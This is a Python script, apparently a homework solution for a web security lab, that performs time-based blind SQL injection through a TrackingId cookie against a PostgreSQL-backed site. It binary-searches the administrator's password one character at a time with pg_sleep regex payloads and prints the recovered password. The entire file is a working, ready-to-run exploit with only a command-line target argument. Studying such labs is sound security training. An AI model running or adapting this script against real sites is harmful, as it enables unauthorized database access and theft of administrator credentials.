import requests, sys, time
import string

def test_cookie(site: str, cookie_string: str) -> float:
    """
    Sends a GET request with a crafted TrackingId cookie and returns the response time.

    Args:
        site (str): Target lab domain (no protocol or trailing slash)
        cookie_string (str): SQLi payload to inject via the cookie

    Returns:
        float: Response time in seconds
    """
    try:
        url = f'https://{site}/'
        cookie_data = {
            'TrackingId': cookie_string  # SQL injection is tested through this cookie
        }
        resp = requests.get(url, cookies=cookie_data, timeout=10)
        resp.raise_for_status()  # Raise HTTPError if status code indicates an error
        return resp.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP error: {e}")
        return 0.0  # Return a low time to avoid false positives during attack

def binary_search_char(site: str, charset: str, prefix: str) -> str:
    """
    Performs binary search to find the next correct character of the password.

    Args:
        site (str): Target domain
        charset (str): Valid characters to test
        prefix (str): Known correct prefix of the password so far

    Returns:
        str: Next character found via time-based SQLi
    """
    low = 0
    high = len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        test_range = charset[low:mid + 1]  # Midpoint range of characters to test
        
        # Regex pattern to check if the next character falls within test_range
        bracket_expr = f"[{test_range}]"
        payload = (
            f"x'%3Bselect case when (username='administrator' and password ~ '^{prefix}{bracket_expr}') "
            f"then pg_sleep(3) else pg_sleep(0) end from users--"
        )
        elapsed = test_cookie(site, payload)

        if elapsed > 3:
            # Character is in lower half
            if low == high:
                return charset[low]  # Only one character left, must be it
            high = mid  # Search lower half
        else:
            low = mid + 1  # Search upper half

    return ''  # Should not hit if logic is correct

def confirm_password(site: str, candidate: str) -> bool:
    """
    Confirms that a guessed password is exactly correct using ^...$ regex match.

    Args:
        site (str): Target lab domain
        candidate (str): Full candidate password to confirm

    Returns:
        bool: True if password match confirmed, False otherwise
    """
    payload = (
        f"x'%3Bselect case when (username='administrator' and password ~ '^{candidate}$') "
        f"then pg_sleep(3) else pg_sleep(0) end from users--"
    )
    return test_cookie(site, payload) > 3

def extract_password(site: str, charset: str) -> str:
    """
    Extracts the administrator password using binary search character-by-character.

    Args:
        site (str): Target domain
        charset (str): Valid characters to brute-force

    Returns:
        str: Full administrator password
    """
    password = ''  # Final password string
    start_time = time.perf_counter()  # Start timer for performance measurement

    while True:
        next_char = binary_search_char(site, charset, password)
        if not next_char:
            break  # No next character found, assume end of password
        
        password += next_char  # Append found character to known password prefix
        print(password)  # Output current known password incrementally

        if confirm_password(site, password):
            break  # Final check confirms password is correct

    end_time = time.perf_counter()  # End timer
    print(f"\nDone. Found {password}")
    print(f"Time elapsed is {end_time - start_time}")
    return password

if __name__ == '__main__':
    # Ensure proper usage
    if len(sys.argv) != 2:
        print("Usage: python hw2.py <site>")
        sys.exit(1)

    # Clean input URL
    site = sys.argv[1].rstrip('/').lstrip('https://')
    charset = string.ascii_lowercase + string.digits  # Define valid character set

    # Optional: confirm SQL injection is working
    print("[*] Sanity test...")
    print(test_cookie(site, "x"))
    print(test_cookie(site, "x' || pg_sleep(3) -- "))

    # Begin password extraction
    print("\n[*] Beginning binary search password extraction...\n")
    extract_password(site, charset)